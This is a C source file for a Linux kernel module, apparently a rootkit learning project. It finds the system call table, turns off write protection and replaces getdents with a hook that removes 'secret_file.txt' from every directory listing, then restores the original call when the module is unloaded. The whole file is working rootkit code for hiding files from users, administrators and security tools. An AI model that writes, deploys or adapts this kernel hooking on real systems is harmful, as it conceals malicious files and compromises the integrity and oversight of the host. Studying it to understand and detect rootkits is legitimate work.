#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h> //kmalloc()
#include <linux/uaccess.h> //copy_from_user()

#include "../implementation/func.h"

#define SECRET_FILE "secret_file.txt"

//A hook function to the real syscall getdents
/*
int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
*source: https://www.man7.org/linux/man-pages/man2/getdents.2.html
asmlinkage to tell the compiler don't look into the registers for arguments.
*/

long (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

unsigned long **sys_call_table;

asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    int real_count = (*real_getdents)(fd, dirp, count);
    int modified_count = 0;
    struct linux_dirent *fake_dirp, *real_dirp, *fake_dirp_tmp, *real_dirp_tmp;
    //get the real getdents result first, which is the total number of items at where dirp pointed to. Now it has not been modified yet
    if (real_count == 0) {
        return 0;
    }

    fake_dirp = (struct linux_dirent *)kmalloc(real_count, GFP_KERNEL);
    fake_dirp_tmp = fake_dirp;

    real_dirp = (struct linux_dirent *)kmalloc(real_count, GFP_KERNEL);
    real_dirp_tmp = real_dirp;

    copy_from_user(real_dirp, dirp, real_count);

    
    while (real_count) {
        real_count -= real_dirp_tmp->d_reclen;
        if (strncmp(real_dirp_tmp->d_name, SECRET_FILE, strlen(SECRET_FILE)) != 0) {
            //Our secret file was not found. We do what real getdents does.
            memmove(fake_dirp_tmp, (char *)real_dirp_tmp, real_dirp_tmp->d_reclen);
            fake_dirp_tmp = (struct linux_dirent *)((char *)fake_dirp_tmp + real_dirp_tmp->d_reclen);
            modified_count += real_dirp_tmp->d_reclen;
        }
        //Otherwise, it has been found, we simply skip this one. We don't add it to the fake result.
        real_dirp_tmp = (struct linux_dirent *)((char *)real_dirp_tmp + real_dirp_tmp->d_reclen);
    }

    copy_to_user(dirp, fake_dirp, modified_count);
    kfree(fake_dirp);
    kfree(real_dirp);
    fake_dirp = NULL;
    real_dirp = NULL;
    fake_dirp_tmp = NULL;
    real_dirp_tmp = NULL;

    return modified_count;
}

int my_init(void) {
    printk("----------Init hide file----------\n");
    sys_call_table = get_sys_call_table();
    if (!sys_call_table) {
        printk("Failed to get syscall table.\n");
        return 0;
    }
    //Debug mesg
    real_getdents = (void *)sys_call_table[__NR_getdents];
    printk("Real system call getdents at 0x%p\n", (unsigned long *)real_getdents);
    disable_write_protection();
    sys_call_table[__NR_getdents] = (unsigned long *)&fake_getdents;
    enable_write_protection();
    printk("Fake system call getdents at 0x%p\n", (unsigned long *)&fake_getdents);
    printk("Now sys_call_table[__NR_getdents] address 0x%p\n", (unsigned long *)sys_call_table[__NR_getdents]);
    return 0;
}

void my_exit(void) {
    //Recover the syscall table
    printk("Exiting hide file.\n");
    disable_write_protection();
    sys_call_table[__NR_getdents] = (unsigned long *)real_getdents;
    enable_write_protection();
    printk("Now sys_call_table[__NR_getdents] address 0x%p\n", (unsigned long *)sys_call_table[__NR_getdents]);
    printk("----------Hide file module removed----------\n");
}

module_init(my_init);
module_exit(my_exit);
